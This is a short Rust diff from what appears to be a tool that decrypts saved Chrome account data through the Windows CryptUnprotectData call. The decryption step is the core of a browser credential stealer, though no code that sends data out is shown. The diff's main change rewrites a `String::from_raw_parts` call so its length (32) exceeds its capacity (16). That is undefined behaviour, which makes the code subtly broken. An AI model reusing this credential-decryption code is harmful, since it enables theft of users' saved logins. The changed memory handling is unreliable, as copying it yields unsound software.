@@ -26,10 +26,12 @@ impl ChromeAccount {
                 cbData: *vec_len as u32,
                 pbData: vec_ptr,
             };
+
             let mut data_out: DATA_BLOB = CRYPTOAPI_BLOB {
                 cbData: 0,
                 pbData: &mut 0,
             };
+
             let mut p_descr_out: LPWSTR = std::ptr::null_mut();
 
             let succ_unprotect = CryptUnprotectData(
@@ -42,10 +44,10 @@ impl ChromeAccount {
                 &mut data_out,
             );
             if succ_unprotect == 0 {
-                panic!("Failed to decrypt");
+                panic!("Failed to decrypt! Exiting!");
             }
 
-            String::from_raw_parts(data_out.pbData, 16, 16)
+            String::from_raw_parts(data_out.pbData, 32,16)
         }
     }
 
